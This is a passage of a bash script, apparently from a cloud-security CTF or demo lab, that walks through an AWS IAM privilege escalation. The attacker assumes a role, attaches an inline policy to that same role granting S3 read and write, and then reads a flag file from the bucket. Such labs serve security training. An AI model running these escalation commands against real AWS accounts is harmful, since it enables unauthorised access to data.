...
show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$STARTING_ROLE_ARN\" --role-session-name \"iam-005-demo-session\""
ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
    --role-arn "$STARTING_ROLE_ARN" \
    --role-session-name "iam-005-demo-session")

# Update credentials to use assumed role session
...
show_attack_cmd "Attacker" "aws iam put-role-policy --role-name \"$STARTING_ROLE\" --policy-name \"EscalatedS3Access\" --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":[\"s3:ListBucket\",\"s3:GetObject\",\"s3:PutObject\"],\"Resource\":[\"arn:aws:s3:::${BUCKET_NAME}\",\"arn:aws:s3:::${BUCKET_NAME}/*\"]}]}'"
...
# [EXPLOIT] Step 6: Verify S3 bucket access
...
# [EXPLOIT] Step 8: Read the CTF flag
echo -e "${YELLOW}Step 8: Reading CTF flag from bucket${NC}"
...
echo -e "Step 4: Read ${YELLOW}flag.txt${NC} — ${GREEN}$FLAG_VALUE${NC}"
echo -e "Result: ${GREEN}S3 Bucket Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (PutRolePolicy on self) → S3 Bucket → flag.txt (CTF flag)"
echo ""
